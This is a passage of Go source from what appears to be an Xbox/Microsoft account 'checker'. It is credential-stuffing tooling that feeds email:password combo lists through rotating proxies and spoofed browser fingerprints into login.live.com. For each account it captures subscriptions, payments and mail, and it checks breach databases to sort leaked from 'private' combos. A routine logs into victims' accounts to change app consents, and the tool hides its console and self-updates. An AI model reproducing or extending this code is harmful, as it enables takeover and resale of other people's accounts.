			if m.Preview == "" && m.HTML != "" {
				m.Preview = stripMailHTML(m.HTML)
			}
			for _, dk := range []string{"DateTimeReceived", "LastModifiedTime", "DateTimeCreated", "ReceivedTime", "DateTime"} {
				if d, ok := val[dk].(string); ok && d != "" {
					m.Date = d
					break
				}
			}
			if src, ok := val["Source"].(map[string]interface{}); ok && m.Date == "" {
				for _, dk := range []string{"DateTimeReceived", "LastModifiedTime", "DateTimeCreated"} {
					if d, ok := src[dk].(string); ok && d != "" {
						m.Date = d
						break
					}
				}
			}
			m.From = firstMailFrom(val)
			if src, ok := val["Source"].(map[string]interface{}); ok && m.From == "" {
				m.From = firstMailFrom(src)
			}
			*out = append(*out, m)
			return
		}
		if src, ok := val["Source"].(map[string]interface{}); ok {
			collectMailMsgs(src, out)
			return
		}
		for _, child := range val {
			collectMailMsgs(child, out)
		}
	case []interface{}:
		for _, child := range val {
			collectMailMsgs(child, out)
		}
	}
}

// countSearchResults extracts how many hits the search returned.
// Prefers Total / ResultCount fields; falls back to counting Results arrays.
func countSearchResults(v interface{}) int {
	switch val := v.(type) {
	case map[string]interface{}:
		for _, key := range []string{"Total", "ResultCount", "total", "Count"} {
			if t, ok := val[key]; ok {
				switch n := t.(type) {
				case float64:
					return int(n)
				case int:
					return n
				case json.Number:
					i, _ := n.Int64()
					return int(i)
				}
			}
		}
		// Count Results array length if present
		if results, ok := val["Results"].([]interface{}); ok {
			return len(results)
		}
		// Recurse into EntitySets / ResultSets
		total := 0
		found := false
		for _, key := range []string{"EntitySets", "ResultSets", "EntityResults", "value"} {
			if child, ok := val[key]; ok {
				if n := countSearchResults(child); n >= 0 {
					total += n
					found = true
				}
			}
		}
		if found {
			return total
		}
		for _, child := range val {
			if n := countSearchResults(child); n > 0 {
				return n
			}
		}
	case []interface{}:
		total := 0
		for _, item := range val {
			n := countSearchResults(item)
			if n > 0 {
				total += n
			}
		}
		return total
	}
	return 0
}

// detectActiveServices reads the paymentTransactions JSON and reports only
// subscriptions that are still valid as of now (run time, not a hardcoded date).
// A sub is treated as currently entitled if:
//   - recurrenceState looks live (Active / Enabled / etc.), or
//   - nextRenewalDate is still in the future (canceled but remaining time left)
func classifyAccountType(email, proxyStr string) string {
	email = strings.TrimSpace(email)
	if email == "" {
		return "Private"
	}
	first := classifyDatabreach(email, proxyStr)
	if strings.EqualFold(first, "Free") {
		return "Free"
	}
	// First API said private — confirm with Cybernews leak check.
	if classifyCybernews(email, proxyStr) == "Free" {
		return "Free"
	}
	return "Private"
}

func classifyDatabreach(email, proxyStr string) string {
	pii, _ := json.Marshal(email)
	payload := fmt.Sprintf(`{"file":"/app/rpc/search.telefunc.ts","name":"public_search","args":[{"piis":[{"type":"email","value":%s,"pii_id":"%d"}],"main_breach_id":"!undefined"}]}`, string(pii), time.Now().UnixMilli())
	cli := newTLSClient(proxyStr, 12*time.Second, true)
	if cli == nil {
		return "Private"
	}
	home, _ := http.NewRequest("GET", "https://databreach.com/", nil)
	home.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	if resp, err := doReq(cli, home); err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	req, err := http.NewRequest("POST", "https://databreach.com/_telefunc?_telefunc=txt", strings.NewReader(payload))
	if err != nil {
		return "Private"
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Origin", "https://databreach.com")
	req.Header.Set("Referer", "https://databreach.com/")
	req.Header.Set("X-Telefunc-Request", "txt")
	req.Header.Set("Accept", "*/*")
	resp, err := doReq(cli, req)
	if err != nil {
		return "Private"
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var wrap struct {
		Ret struct {
			Results       []json.RawMessage `json:"results"`
			TotalBreaches int               `json:"totalBreaches"`
			Hidden        int               `json:"hiddenBreaches"`
		} `json:"ret"`
	}
	if json.Unmarshal(b, &wrap) != nil {
		return "Private"
	}
	if len(wrap.Ret.Results) > 0 || wrap.Ret.TotalBreaches > 0 || wrap.Ret.Hidden > 0 {
		return "Free"
	}
	return "Private"
}

func classifyCybernews(email, proxyStr string) string {
	cli := newTLSClient(proxyStr, 12*time.Second, true)
	if cli == nil {
		return "Private"
	}
	body, _ := json.Marshal(map[string]string{"email": email})
	req, err := http.NewRequest("POST", "https://data-leak-check.cybernews.com/chk/email", strings.NewReader(string(body)))
	if err != nil {
		return "Private"
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://cybernews.com")
	req.Header.Set("Referer", "https://cybernews.com/")
	req.Header.Set("Accept", "*/*")
	resp, err := doReq(cli, req)
	if err != nil {
		return "Private"
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	var wrap struct {
		DataLeakEmails []json.RawMessage `json:"dataLeakEmails"`
		Total          int               `json:"total"`
	}
	if json.Unmarshal(b, &wrap) != nil {
		return "Private"
	}
	if wrap.Total > 0 || len(wrap.DataLeakEmails) > 0 {
		return "Free"
	}
	return "Private"
}


func detectActiveServices(txStr string) string {
	if strings.TrimSpace(txStr) == "" {
		return "No subscriptions"
	}

	var root map[string]interface{}
	if err := json.Unmarshal([]byte(txStr), &root); err != nil {
		return "No subscriptions"
	}

	list, _ := root["subscriptions"].([]interface{})
	if len(list) == 0 {
		return "No subscriptions"
	}

	now := time.Now().UTC()

	// title -> keep the "best" currently-valid instance
	type subInfo struct {
		title     string
		state     string
		autoRenew bool
		until     time.Time
	}
	active := make(map[string]subInfo)

	parseDate := func(s string) (time.Time, bool) {
		s = strings.TrimSpace(s)
		if s == "" {
			return time.Time{}, false
		}
		layouts := []string{
			time.RFC3339Nano,
			time.RFC3339,
			"2006-01-02T15:04:05.9999999Z07:00",
			"2006-01-02T15:04:05Z07:00",
			"2006-01-02",
		}
		for _, layout := range layouts {
			if t, err := time.Parse(layout, s); err == nil {
				return t.UTC(), true
			}
		}
		return time.Time{}, false
	}

	isLiveState := func(state string) bool {
		s := strings.ToLower(strings.TrimSpace(state))
		switch s {
		case "active", "enabled", "activating", "pending", "trial", "trialing":
			return true
		default:
			return false
		}
	}

	isDeadState := func(state string) bool {
		s := strings.ToLower(strings.TrimSpace(state))
		switch s {
		case "failed", "inactive", "expired", "revoked", "terminated":
			return true
		default:
			return false
		}
	}

	for _, item := range list {
		obj, ok := item.(map[string]interface{})
		if !ok {
			continue
		}
		title, _ := obj["title"].(string)
		title = strings.TrimSpace(title)
		if title == "" {
			continue
		}
		state, _ := obj["recurrenceState"].(string)
		autoRenew, _ := obj["autoRenew"].(bool)

		untilStr, _ := obj["nextRenewalDate"].(string)
		until, hasUntil := parseDate(untilStr)

		// Currently entitled if:
		// 1) state is live, or
		// 2) nextRenewalDate is still in the future (paid period not over yet),
		//    even when canceled / autoRenew=false.
		// Dead states with a past (or missing) end date are ignored.
		entitled := false
		if isLiveState(state) {
			entitled = true
		} else if hasUntil && until.After(now) && !isDeadState(state) {
			// Canceled but still within the paid window
			entitled = true
		} else if hasUntil && until.After(now) && strings.EqualFold(state, "Canceled") {
			entitled = true
		}

		if !entitled {
			continue
		}

		info := subInfo{title: title, state: state, autoRenew: autoRenew, until: until}
		if prev, exists := active[title]; !exists || info.until.After(prev.until) {
			active[title] = info
		}
	}

	if len(active) == 0 {
		return "No subscriptions"
	}

	// Prefer the well-known Game Pass / Gold labels in the old "Services: X" style.
	// If several are valid at once, pick the highest tier; otherwise list others.
	priority := []string{
		"Xbox Game Pass Ultimate",
		"PC Game Pass",
		"Xbox Game Pass Core",
		"Xbox Game Pass Essential",
		"Xbox Game Pass",
		"Xbox Live Gold",
		"Xbox Live Gold / Game Pass Core",
	}

	pick := ""
	for _, name := range priority {
		if _, ok := active[name]; ok {
			pick = name
			break
		}
		// fuzzy: title contains the known name
		if pick == "" {
			for t := range active {
				if strings.EqualFold(t, name) || strings.Contains(strings.ToLower(t), strings.ToLower(name)) {
					pick = t
					break
				}
			}
		}
		if pick != "" {
			break
		}
	}

	if pick != "" {
		return pick
	}

	// Fallback: join remaining titles (Fortnite Crew, Realms, etc.)
	var titles []string
	for t := range active {
		titles = append(titles, t)
	}
	return strings.Join(titles, ", ")
}

func extractPPFT(htmlContent string) string {
	reServerData := regexp.MustCompile(`var ServerData = ({.*?});`)
	matches := reServerData.FindStringSubmatch(htmlContent)
	if len(matches) > 1 {
		var rawData map[string]interface{}
		if err := json.Unmarshal([]byte(matches[1]), &rawData); err == nil {
			if sftTag, ok := rawData["sFTTag"].(string); ok {
				reVal := regexp.MustCompile(`value="([^"]+)"`)
				valMatches := reVal.FindStringSubmatch(sftTag)
				if len(valMatches) > 1 {
					return valMatches[1]
				}
			}
		}
	}

	reInput := regexp.MustCompile(`name="PPFT"[^>]*value="([^"]+)"`)
	inputMatches := reInput.FindStringSubmatch(htmlContent)
	if len(inputMatches) > 1 {
		return inputMatches[1]
	}

	return ""
}

func extractParameter(urlStr, key string) string {
	// Tokens often appear in URL fragments (#access_token=...) – normalize
	urlStr = strings.ReplaceAll(urlStr, "#", "&")
	idx := strings.Index(urlStr, key)
	if idx == -1 {
		return ""
	}
	sub := urlStr[idx+len(key):]
	endIdx := strings.IndexAny(sub, "&\n\r\"'")
	if endIdx == -1 {
		return sub
	}
	return sub[:endIdx]
}

func parseBetween(s, start, end string) string {
	idx := strings.Index(s, start)
	if idx == -1 {
		return ""
	}
	sub := s[idx+len(start):]
	endIdx := strings.Index(s, end)
	if endIdx == -1 {
		return sub
	}
	return sub[:endIdx]
}

func translateCountry(code string) string {
	countries := map[string]string{
		"US": "United States", "GB": "United Kingdom", "CA": "Canada",
		"AU": "Australia", "DE": "Germany", "FR": "France", "BR": "Brazil",
	}
	if name, ok := countries[strings.ToUpper(code)]; ok {
		return name
	}
	return code
}

func appendResultToFile(filename, text string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(text + "\n")
}

// fileExists returns true if path exists and is a regular file.
func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

func resolveLocalFile(path string) string {
	path = strings.TrimSpace(path)
	if path == "" {
		return ""
	}
	if fileExists(path) {
		return path
	}
	base := filepath.Base(path)
	cands := []string{base, filepath.Join(".", base)}
	if wd, err := os.Getwd(); err == nil {
		cands = append(cands, filepath.Join(wd, base), filepath.Join(wd, path))
	}
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		cands = append(cands, filepath.Join(dir, base), filepath.Join(dir, path))
	}
	for _, p := range cands {
		if fileExists(p) {
			return p
		}
	}
	return path
}

// loadProxies accepts either:
//   - a single proxy string (e.g. "user:pass@ip:port" or "ip:port")
//   - a .txt filename (just the name, e.g. "proxies.txt") containing one proxy per line
//
// Returns a slice of proxies (empty slice = no proxy).
func loadProxies(input string) ([]string, error) {
	input = strings.TrimSpace(input)
	if input == "" {
		return nil, nil
	}

	// Treat as proxy list file if it ends with .txt or the path exists as a file
	if strings.HasSuffix(strings.ToLower(input), ".txt") || fileExists(input) {
		file, err := os.Open(input)
		if err != nil {
			return nil, fmt.Errorf("could not open proxy file %q: %v", input, err)
		}
		defer file.Close()

		var proxies []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			line = strings.TrimPrefix(line, "\ufeff")
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			if n := formatProxyURL(line); n != "" {
				proxies = append(proxies, n)
			} else {
				proxies = append(proxies, line)
			}
		}
		if err := scanner.Err(); err != nil {
			return nil, err
		}
		if len(proxies) == 0 {
			return nil, fmt.Errorf("proxy file %q is empty", input)
		}
		return proxies, nil
	}

	// Otherwise treat the whole input as a single proxy
	return []string{input}, nil
}

type livePxPool struct {
	mu   sync.Mutex
	all  []string
	live []string
	dead []string
	i    int
}

var (
	pxPools   = map[string]*livePxPool{}
	pxPoolsMu sync.Mutex
)

func ensurePxPool(key string, list []string) *livePxPool {
	pxPoolsMu.Lock()
	p := pxPools[key]
	if p == nil {
		p = &livePxPool{all: append([]string{}, list...)}
		pxPools[key] = p
		go testPxPool(key)
	} else if len(list) > 0 && len(list) != len(p.all) {
		p.mu.Lock()
		p.all = append([]string{}, list...)
		p.mu.Unlock()
	}
	pxPoolsMu.Unlock()
	return p
}

func takeLiveProxy(key string, list []string) string {
	if len(list) == 0 {
		return ""
	}
	p := ensurePxPool(key, list)
	p.mu.Lock()
	defer p.mu.Unlock()
	if len(p.live) > 0 {
		s := p.live[p.i%len(p.live)]
		p.i++
		return s
	}
	s := list[p.i%len(list)]
	p.i++
	return s
}

func testPxPool(key string) {
	sem := make(chan struct{}, 2)
	for {
		pxPoolsMu.Lock()
		p := pxPools[key]
		pxPoolsMu.Unlock()
		if p == nil {
			return
		}
		p.mu.Lock()
		all := append([]string{}, p.all...)
		p.mu.Unlock()
		if len(all) == 0 {
			time.Sleep(8 * time.Second)
			continue
		}
		const maxSweep = 80
		if len(all) > maxSweep {
			all = all[:maxSweep]
		}
		for _, px := range all {
			sem <- struct{}{}
			go func(px string) {
				defer func() { <-sem }()
				ok := probeProxy(px)
				p.mu.Lock()
				if ok {
					found := false
					for _, x := range p.live {
						if x == px {
							found = true
							break
						}
					}
					if !found {
						p.live = append(p.live, px)
					}
				} else {
					nlive := p.live[:0]
					for _, x := range p.live {
						if x != px {
							nlive = append(nlive, x)
						}
					}
					p.live = nlive
				}
				p.mu.Unlock()
			}(px)
		}
		time.Sleep(25 * time.Second)
	}
}

func probeProxy(px string) bool {
	c := newTLSClient(px, 6*time.Second, true)
	if c == nil {
		return false
	}
	req, err := http.NewRequest("GET", "https://login.live.com/", nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := doReq(c, req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode > 0 && resp.StatusCode < 500
}

func parseProxyLines(body string) []string {
	body = strings.TrimSpace(body)
	seen := map[string]struct{}{}
	var proxies []string
	add := func(s string) {
		s = strings.TrimSpace(s)
		if s == "" {
			return
		}
		if n := formatProxyURL(s); n != "" {
			s = n
		} else if m := reProxyHost.FindString(s); m != "" {
			if n := formatProxyURL(m); n != "" {
				s = n
			} else {
				s = m
			}
		} else {
			return
		}
		if _, ok := seen[s]; ok {
			return
		}
		seen[s] = struct{}{}
		proxies = append(proxies, s)
	}
	trim := strings.TrimSpace(body)
	if strings.HasPrefix(trim, "[") || strings.HasPrefix(trim, "{") {
		var arr []map[string]any
		if json.Unmarshal([]byte(trim), &arr) == nil {
			for _, o := range arr {
				ip, _ := o["ip"].(string)
				if ip == "" {
					ip, _ = o["host"].(string)
				}
				port := fmt.Sprint(o["port"])
				if ip != "" && port != "" && port != "<nil>" {
					add(ip + ":" + port)
				}
			}
		} else {
			var obj map[string]any
			if json.Unmarshal([]byte(trim), &obj) == nil {
				for _, key := range []string{"data", "proxies", "list", "result"} {
					if raw, ok := obj[key]; ok {
						b, _ := json.Marshal(raw)
						proxies = append(proxies, parseProxyLines(string(b))...)
					}
				}
			}
		}
		if len(proxies) > 0 {
			return proxies
		}
	}
	sc := bufio.NewScanner(strings.NewReader(body))
	buf := make([]byte, 0, 64*1024)
	sc.Buffer(buf, 2<<20)
	for sc.Scan() {
		add(sc.Text())
	}
	for _, m := range reProxyHost.FindAllString(body, -1) {
		add(m)
	}
	return proxies
}

func fetchProxiesFromURLs(urls []string) ([]string, error) {
	seen := map[string]struct{}{}
	var out []string
	cli := newTLSClient("", 25*time.Second, true)
	if cli == nil {
		return nil, fmt.Errorf("could not create http client")
	}
	for _, raw := range urls {
		u := strings.TrimSpace(raw)
		if u == "" {
			continue
		}
		if !strings.Contains(u, "://") {
			u = "http://" + u
		}
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			return out, err
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/plain,text/html,application/json,*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		resp, err := cli.Do(req)
		if err != nil {
			return out, fmt.Errorf("proxy server %s: %v", raw, err)
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
		resp.Body.Close()
		body := string(b)
		if strings.Contains(strings.ToLower(body), "just a moment") || strings.Contains(body, "403 Forbidden") {
			return out, fmt.Errorf("proxy server blocked the request (cloudflare). try again")
		}
		for _, p := range parseProxyLines(body) {
			if _, ok := seen[p]; ok {
				continue
			}
			seen[p] = struct{}{}
			out = append(out, p)
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no proxies from server URLs")
	}
	return out, nil
}

type updateManifest struct {
	Version string `json:"version"`
	SHA256  string `json:"sha256"`
	Key     string `json:"key"`
	Notes   string `json:"notes"`
	URL     string `json:"url"`
}

func r2SignGet(key string) (*stdhttp.Request, error) {
	key = strings.TrimPrefix(key, "/")
	path := "/" + r2Bucket + "/" + strings.ReplaceAll(key, " ", "%20")
	now := time.Now().UTC()
	amz := now.Format("20060102T150405Z")
	dat := now.Format("20060102")
	payload := "UNSIGNED-PAYLOAD"
	canonical := "GET\n" + path + "\n\nhost:" + r2EndpointHost + "\nx-amz-content-sha256:" + payload + "\nx-amz-date:" + amz + "\n\nhost;x-amz-content-sha256;x-amz-date\n" + payload
	scope := dat + "/auto/s3/aws4_request"
	sts := "AWS4-HMAC-SHA256\n" + amz + "\n" + scope + "\n" + fmt.Sprintf("%x", sha256.Sum256([]byte(canonical)))
	mac := func(k, m []byte) []byte {
		h := hmac.New(sha256.New, k)
		h.Write(m)
		return h.Sum(nil)
	}
	k := mac(mac(mac(mac([]byte("AWS4"+r2SecretKey), []byte(dat)), []byte("auto")), []byte("s3")), []byte("aws4_request"))
	sig := fmt.Sprintf("%x", mac(k, []byte(sts)))
	auth := "AWS4-HMAC-SHA256 Credential=" + r2AccessKey + "/" + scope + ", SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=" + sig
	req, err := stdhttp.NewRequest("GET", "https://"+r2EndpointHost+path, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("x-amz-date", amz)
	req.Header.Set("x-amz-content-sha256", payload)
	req.Header.Set("Authorization", auth)
	return req, nil
}

func r2Get(key string) ([]byte, error) {
	req, err := r2SignGet(key)
	if err != nil {
		return nil, err
	}
	cli := &stdhttp.Client{Timeout: 3 * time.Minute}
	resp, err := cli.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 180<<20))
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("r2 %s: %s %s", key, resp.Status, strings.TrimSpace(string(b)))
	}
	return b, nil
}

func r2Put(key string, body []byte, contentType string) error {
	key = strings.TrimPrefix(key, "/")
	path := "/" + r2Bucket + "/" + strings.ReplaceAll(key, " ", "%20")
	now := time.Now().UTC()
	amz := now.Format("20060102T150405Z")
	dat := now.Format("20060102")
	payload := fmt.Sprintf("%x", sha256.Sum256(body))
	canonical := "PUT\n" + path + "\n\nhost:" + r2EndpointHost + "\nx-amz-content-sha256:" + payload + "\nx-amz-date:" + amz + "\n\nhost;x-amz-content-sha256;x-amz-date\n" + payload
	scope := dat + "/auto/s3/aws4_request"
	sts := "AWS4-HMAC-SHA256\n" + amz + "\n" + scope + "\n" + fmt.Sprintf("%x", sha256.Sum256([]byte(canonical)))
	mac := func(k, m []byte) []byte {
		h := hmac.New(sha256.New, k)
		h.Write(m)
		return h.Sum(nil)
	}
	k := mac(mac(mac(mac([]byte("AWS4"+r2WriteSecretKey), []byte(dat)), []byte("auto")), []byte("s3")), []byte("aws4_request"))
	sig := fmt.Sprintf("%x", mac(k, []byte(sts)))
	auth := "AWS4-HMAC-SHA256 Credential=" + r2WriteAccessKey + "/" + scope + ", SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=" + sig
	req, err := stdhttp.NewRequest("PUT", "https://"+r2EndpointHost+path, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("x-amz-date", amz)
	req.Header.Set("x-amz-content-sha256", payload)
	req.Header.Set("Authorization", auth)
	if contentType == "" {
		contentType = "application/octet-stream"
	}
	req.Header.Set("Content-Type", contentType)
	cli := &stdhttp.Client{Timeout: 45 * time.Second}
	resp, err := cli.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		return fmt.Errorf("r2 put %s: %s %s", key, resp.Status, strings.TrimSpace(string(b)))
	}
	return nil
}

func fetchUpdateManifest() (updateManifest, error) {
	var m updateManifest
	b, err := r2Get(r2ManifestKey)
	if err != nil {
		return m, err
	}
	if err := json.Unmarshal(b, &m); err != nil {
		return m, err
	}
	m.Version = strings.TrimSpace(m.Version)
	m.SHA256 = strings.ToLower(strings.TrimSpace(m.SHA256))
	if m.Key == "" {
		m.Key = r2ExeKey
	}
	return m, nil
}

func versionParts(v string) []int {
	v = strings.TrimPrefix(strings.ToLower(strings.TrimSpace(v)), "v")
	var out []int
	for _, p := range strings.Split(v, ".") {
		n := 0
		fmt.Sscanf(p, "%d", &n)
		out = append(out, n)
	}
	return out
}

func versionNewer(remote, local string) bool {
	r, l := versionParts(remote), versionParts(local)
	n := len(r)
	if len(l) > n {
		n = len(l)
	}
	for i := 0; i < n; i++ {
		rv, lv := 0, 0
		if i < len(r) {
			rv = r[i]
		}
		if i < len(l) {
			lv = l[i]
		}
		if rv > lv {
			return true
		}
		if rv < lv {
			return false
		}
	}
	return false
}

func handleUpdateCheck(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	m, err := fetchUpdateManifest()
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error(), "local": AppVersion})
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{
		"ok":     true,
		"update": versionNewer(m.Version, AppVersion),
		"local":  AppVersion,
		"remote": m.Version,
		"sha256": m.SHA256,
	})
}

func handleUpdateApply(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	w.Header().Set("Content-Type", "application/json")
	m, err := fetchUpdateManifest()
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	if !versionNewer(m.Version, AppVersion) {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "already on " + AppVersion})
		return
	}
	raw, err := r2Get(m.Key)
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	sum := sha256.Sum256(raw)
	got := hex.EncodeToString(sum[:])
	if m.SHA256 != "" && got != m.SHA256 {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "sha256 mismatch got " + got})
		return
	}
	exe, err := os.Executable()
	if err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	tmp := filepath.Join(os.TempDir(), "xbox-checker-new.exe")
	if err := os.WriteFile(tmp, raw, 0755); err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
		return
	}
	old := exe + ".old"
	_ = os.Remove(old)
	if err := os.Rename(exe, old); err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "could not move old exe: " + err.Error()})
		return
	}
	if err := copyFile(tmp, exe); err != nil {
		_ = os.Rename(old, exe)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "could not write new exe: " + err.Error()})
		return
	}
	if err := startDetached(exe); err != nil {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "could not start new exe: " + err.Error()})
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "restarting": true, "version": m.Version})
	go func() {
		time.Sleep(600 * time.Millisecond)
		os.Exit(0)
	}()
}

func startDetached(exe string) error {
	if runtime.GOOS == "windows" {
		pid := os.Getpid()
		bat := filepath.Join(os.TempDir(), "solo-upd.bat")
		script := fmt.Sprintf("@echo off\r\n:wait\r\ntasklist /FI \"PID eq %d\" | find \"%d\" >nul\r\nif not errorlevel 1 (\r\n  timeout /t 1 /nobreak >nul\r\n  goto wait\r\n)\r\ntaskkill /F /IM \"%s\" >nul 2>nul\r\nstart \"\" \"%s\"\r\nif exist \"%s.old\" del /F /Q \"%s.old\"\r\ndel \"%%~f0\"\r\n", pid, pid, filepath.Base(exe), exe, exe, exe)
		if err := os.WriteFile(bat, []byte(script), 0644); err != nil {
			return err
		}
		cmd := exec.Command("cmd", "/C", "start", "/B", "", bat)
		cmd.Stdin = nil
		cmd.Stdout = nil
		cmd.Stderr = nil
		return cmd.Start()
	}
	cmd := exec.Command(exe)
	cmd.Dir = filepath.Dir(exe)
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Start()
}

func afterUpdateCleanup() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	_ = os.Remove(exe + ".old")
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}
	k := syscall.NewLazyDLL("kernel32.dll")
	u := syscall.NewLazyDLL("user32.dll")
	hwnd, _, _ := k.NewProc("GetConsoleWindow").Call()
	if hwnd != 0 {
		u.NewProc("ShowWindow").Call(hwnd, 0)
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	_, err = io.Copy(out, in)
	cerr := out.Close()
	if err != nil {
		return err
	}
	return cerr
}

// parseKeywords splits a comma/space separated string into clean keywords.
func parseKeywords(input string) []string {
	input = strings.TrimSpace(input)
	if input == "" {
		return nil
	}
	// allow both comma and space separators
	raw := strings.FieldsFunc(input, func(r rune) bool {
		return r == ',' || r == ';' || r == '|'
	})
	var out []string
	for _, k := range raw {
		k = strings.TrimSpace(k)
		if k != "" {
			out = append(out, k)
		}
	}
	return out
}

func attachSession(cfg *Config, resume bool) {
	cfg.sessMu = &sync.Mutex{}
	now := time.Now().Format("2006-01-02 15:04:05")
	if resume && cfg.Session != nil {
		if cfg.Session.RetryCounts == nil {
			cfg.Session.RetryCounts = map[string]int{}
		}
		if cfg.Session.TriedProxies == nil {
			cfg.Session.TriedProxies = map[string][]string{}
		}
		return
	}
	if resume {
		if s, err := loadSession(); err == nil && s != nil {
			cfg.Session = s
			if s.RetryCounts == nil {
				s.RetryCounts = map[string]int{}
			}
			if s.TriedProxies == nil {
				s.TriedProxies = map[string][]string{}
			}
			return
		}
	}
	cfg.Session = &Session{
		ComboPath:     cfg.ComboPath,
		ProxyInput:    cfg.ProxyInput,
		KeywordsInput: cfg.KeywordsInput,
		Workers:       cfg.Workers,
		CapKeywords:   cfg.CapKeywords,
		CapPayments:   cfg.CapPayments,
		CapPromos:     cfg.CapPromos,
		CapFortnite:   cfg.CapFortnite,
		CapturesSet:   true,
		DoneRanges:    []LineRange{},
		RetryLines:    []int{},
		RetryCounts:   map[string]int{},
		TriedProxies:  map[string][]string{},
		StartedAt:     now,
	}
	saveSession(cfg.Session)
}


func revokeThunderbirdConsent(email, password, proxyStr string) error {
	if email == "" || password == "" {
		return fmt.Errorf("need email:password")
	}
	preset := nextTLSPreset()
	client, noRedir := newTLSClientPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.profile)
	if client == nil || noRedir == nil {
		return fmt.Errorf("could not create client")
	}
	ua := preset.ua
	start := "https://account.live.com/consent/Manage"
	req, err := http.NewRequest("GET", start, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	resp, err := doReq(client, req)
	if err != nil {
		return fmt.Errorf("open manage: %w", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	page := string(body)
	loc := resp.Header.Get("Location")
	if loc == "" && resp.Request != nil && resp.Request.URL != nil {
		loc = resp.Request.URL.String()
	}
	fmt.Println("consent landing", resp.StatusCode, loc, "bytes", len(page))
	ppft := extractPPFT(page)
	if ppft == "" {
		return fmt.Errorf("no login form / PPFT on consent page (status %d)", resp.StatusCode)
	}
	postURL := "https://login.live.com/ppsecure/post.srf"
	if u := firstMatch(page, `action="([^"]+)"`); u != "" {
		postURL = strings.ReplaceAll(u, "&amp;", "&")
	}
	form := url.Values{}
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("passwd", password)
	form.Set("PPFT", ppft)
	form.Set("PPSX", "Passpor")
	form.Set("ps", "2")
	form.Set("NewUser", "1")
	form.Set("LoginOptions", "3")
	form.Set("i13", "0")
	form.Set("type", "11")
	req2, _ := http.NewRequest("POST", postURL, strings.NewReader(form.Encode()))
	req2.Header.Set("User-Agent", ua)
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	resp2, err := doReq(client, req2)
	if err != nil {
		return fmt.Errorf("login post: %w", err)
	}
	b2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	combined := string(b2)
